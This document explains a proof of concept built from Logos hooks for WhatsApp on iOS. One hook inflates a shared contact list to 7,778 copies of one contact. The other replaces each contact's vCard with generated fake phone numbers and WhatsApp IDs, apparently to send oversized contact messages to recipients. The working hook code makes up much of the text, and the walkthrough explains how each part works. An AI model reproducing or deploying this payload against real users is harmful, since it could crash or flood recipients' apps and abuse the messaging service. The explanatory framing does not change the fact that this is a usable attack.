PoC – Code Explanation

This PoC uses Logos hooks to modify two WhatsApp classes:

WAMessageContentContactList
WAMessageContentContact

Each hook changes a different part of the contact data handling.

1. Contact List
objc
%hook WAMessageContentContactList

- (id)contacts {

    NSArray *original = %orig;

    NSMutableArray *expanded = [NSMutableArray array];

    id base = [original firstObject];

    for (int i = 0; i < 7778; i++) {
        [expanded addObject:base];
    }

    return expanded;
}

%end


This hook intercepts the contacts method.

First, %orig calls the original method and saves its result in original.

Then, a new mutable array is created. The code takes the first contact from the original array and adds the same object to the new array 7,778 times.

Finally, it returns the expanded array instead of the original one.

One important detail: these are repeated references to the same contact object, not 7,778 separately created contacts.

2. vCard Serialization
objc
%hook WAMessageContentContact

- (id)serializedVCard {

    static int counter = 0;

    int suffix = 8000 + counter++;

NSString *phone = [NSString stringWithFormat:@"+39 999999 %04d", suffix];
NSString *waid  = [NSString stringWithFormat:@"39999999%04d", suffix];

    NSString *vcard = [NSString stringWithFormat:
        @"BEGIN:VCARD\n"
         "VERSION:3.0\n"
         "N:;contact name here;;;\n"
         "FN:contact name here\n"
         "TEL;type=CELL;type=VOICE;waid=%@:%@\n"
         "END:VCARD",
         waid, phone
    ];

    return vcard;
}

%end


This hook intercepts serializedVCard, replacing the original method's return value with a custom vCard string.

The counter variable is static, meaning its value is preserved between calls.

Every time the method runs, the counter is incremented and used to generate a numeric suffix.

That suffix is then used to construct two strings:

phone: A formatted telephone number.
waid: A corresponding WhatsApp-related identifier.

The vcard variable contains the actual vCard data.

vCard fields
Field	Description
BEGIN:VCARD	Starts the vCard.
VERSION:3.0	Sets the vCard format version.
N	Structured contact name.
FN	Formatted contact name.
TEL	Telephone number information.
waid	WhatsApp-related identifier.
END:VCARD	Ends the vCard.

The %@ placeholders are replaced with the generated waid and phone strings using stringWithFormat:.

3. How the Hooks Work Together

Both hooks modify different methods:

The first changes what the contacts method returns.
The second changes what the serializedVCard method returns.

The first works with the contact array, while the second works with the serialized representation of a contact.

They are separate method overrides, even though they target related contact data.

4. Code Notes
%hook and %end define the Logos hook boundaries.
%orig calls the original implementation.
static int preserves the counter between method calls.
NSMutableArray allows the contact array to be modified.
NSString is used to construct the phone number, identifier, and vCard.
The code assumes the original contact array contains at least one element.
The repeated contacts are references to the same object.
The code does not show the outgoing-message or network transmission implementation.

Note: This explanation describes what the supplied code does. It does not establish whether the modified data reaches another device or causes an account ban.
